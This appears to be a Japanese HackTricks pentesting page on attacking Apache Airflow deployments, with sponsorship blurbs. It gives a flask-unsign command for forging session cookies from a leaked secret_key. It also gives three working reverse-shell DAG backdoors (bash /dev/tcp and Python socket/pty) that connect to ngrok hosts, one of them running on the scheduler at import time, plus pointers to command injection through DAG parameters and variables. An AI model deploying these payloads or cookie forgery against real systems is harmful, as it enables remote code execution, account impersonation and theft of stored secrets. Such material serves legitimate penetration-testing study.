# Apache Airflow セキュリティ

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **会社の広告を HackTricks で見たい**場合や、**PEASS の最新バージョンをダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な [**NFT**](https://opensea.io/collection/the-peass-family) のコレクションをご覧ください
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**Telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローしてください。
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出してください。

</details>

## 基本情報

[**Apache Airflow**](https://airflow.apache.org) は、**データパイプラインやワークフローのスケジューリングとオーケストレーション**に使用されます。データパイプラインのオーケストレーションは、異なるソースからの複雑なデータパイプラインのシーケンス、調整、スケジューリング、管理を指します。これらのデータパイプラインは、ビジネスインテリジェンスアプリケーションやデータサイエンス、ビッグデータアプリケーションをサポートする機械学習モデルによって消費される準備ができたデータセットを提供します。

基本的に、Apache Airflow は、何かしらのイベントや cron が発生したときに、コードの実行をスケジュールすることができます。

## ローカルラボ

### Docker-Compose

[**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) から **docker-compose の設定ファイル**を使用して、完全な Apache Airflow の Docker 環境を起動することができます（MacOS の場合は、Docker VM に少なくとも 6GB の RAM を割り当ててください）。

### Minikube

Apache Airflow を実行する**簡単な方法の一つは、minikube を使用して実行する**ことです。
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflowの設定

Airflowは、設定に**機密情報**を保存することがあります。また、弱い設定が行われている場合もあります。

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflowを攻撃する前に、**権限の仕組み**を理解する必要があります。

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## 攻撃

### Webコンソールの列挙

Webコンソールに**アクセス権限**がある場合、次の情報にアクセスできるかもしれません。

* **変数**（ここにはカスタムの機密情報が保存されている場合があります）
* **接続**（ここにはカスタムの機密情報が保存されている場合があります）
* `http://<airflow>/connection/list/`でアクセスできます
* [**設定**](./#airflow-configuration)（`secret_key`やパスワードなどの機密情報がここに保存されている場合があります）
* ユーザーと役割の一覧
* 各DAGの**コード**（興味深い情報が含まれている場合があります）

### 変数の値の取得

Airflowでは、DAGが値にアクセスできるように、変数を保存することができます。これは他のプラットフォームのシークレットと似ています。**十分な権限**がある場合、GUIでこれらの変数にアクセスできます。`http://<airflow>/variable/list/`でアクセスできます。\
Airflowはデフォルトで変数の値をGUIに表示しますが、[**ここ**](https://marclamberti.com/blog/variables-with-apache-airflow/)によれば、GUIに表示される変数の値を**アスタリスク**に設定することも可能です。

![](<../../.gitbook/assets/image (79).png>)

ただし、これらの**値**は、**CLI**（DBアクセスが必要）、**任意のDAG**の実行、**API**を介した変数のエンドポイントへのアクセス（APIを有効化する必要があります）、**さらにはGUIそのもの**からも取得できます。\
GUIからこれらの値にアクセスするには、アクセスしたい**変数を選択**し、**アクション -> エクスポート**をクリックします。\
別の方法は、**検索フィルタリング**を使用して**隠された値**を**ブルートフォース**で取得することです。

![](<../../.gitbook/assets/image (30).png>)

### 特権昇格

**`expose_config`**の設定が**True**になっている場合、**ユーザー**以上の**ロール**からは、**Web上で設定を読み取る**ことができます。この設定には**`secret_key`**が表示されるため、この有効なキーを持つユーザーは、**自分自身を他のユーザーアカウントになりすますための署名済みクッキーを作成**することができます。
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAGバックドア（AirflowワーカーでのRCE）

**DAGが保存されている場所に書き込み権限**がある場合、単純に**リバースシェルを送信する**DAGを作成することができます。\
なお、このリバースシェルは**Airflowワーカーコンテナ内で実行**されます。
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAGバックドア（AirflowスケジューラのRCE）

もし何かを**コードのルートで実行するように設定**した場合、この執筆時点では、それはDAGのフォルダに配置した後、数秒後に**スケジューラによって実行されます**。
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAGの作成

DAGクラスタ内のマシンを**侵害**することができれば、`dags/`フォルダに新しい**DAGスクリプト**を作成し、DAGクラスタ内の他のマシンに**複製**されます。

### DAGコードのインジェクション

GUIからDAGを実行する際には、それに**引数を渡す**ことができます。\
したがって、DAGが適切にコーディングされていない場合、**コマンドインジェクションの脆弱性**が存在する可能性があります。\
これがこのCVEで起こったことです: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

DAG内で**コマンドインジェクションを探すために必要な情報**は、**パラメータ**がコード**`dag_run.conf.get("param_name")`**で**アクセス**されることです。

さらに、同じ脆弱性は**変数**でも発生する可能性があります（注意: 十分な権限があれば、GUIで変数の値を**制御**することができます）。変数は以下のように**アクセス**されます:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
もしもそれらが例えばbashコマンドの中で使用される場合、コマンドインジェクションを実行することができます。

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合、またはHackTricksをPDFでダウンロードしたい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご覧ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。これは私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **あなたのハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
